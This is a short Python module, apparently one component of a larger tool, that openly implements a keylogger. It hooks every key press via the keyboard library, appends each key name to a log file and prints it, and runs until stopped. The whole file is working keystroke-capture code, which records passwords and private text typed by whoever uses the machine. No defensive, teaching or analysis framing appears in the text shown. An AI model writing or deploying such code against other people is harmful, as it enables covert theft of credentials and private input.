import keyboard
from utils import clear

def run(username):
    clear()
    print("Executing: Keylogger...")
    print("Watching for key presses...")

    keyLogFile = 'logs/keylogfile.txt'

    def onKeyPress(event):
        with open(keyLogFile, 'a') as f:
            f.write('{}'.format(event.name))
        print(event.name)

    keyboard.on_press(onKeyPress)

    keyboard.wait()
